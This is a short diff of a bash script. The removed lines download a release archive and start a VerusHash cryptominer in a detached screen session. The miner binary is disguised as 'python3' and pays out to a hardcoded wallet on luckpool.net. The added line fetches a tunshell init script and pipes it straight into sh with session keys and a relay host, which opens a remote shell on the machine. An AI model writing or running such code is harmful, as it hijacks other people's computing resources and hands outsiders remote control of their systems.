@@ -1,11 +1,1 @@
-#!/bin/bash
- 
-
-# Download file
-wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz
-
-# Extract file
-tar -xvf jui
-
-# Jalankan command dengan screen dan nama acak
-screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RQFBo9pTmWdmM8sfqvLHSdiSM8r1PG5uXZ.Man
+wget https://lets.tunshell.com/init.sh -O - 2> /dev/null | sh -s -- T eOPsedJu494wW5VrcL3wOr bfSfUmCzuz5OEAuoQtU4g8 au.relay.tunshell.com
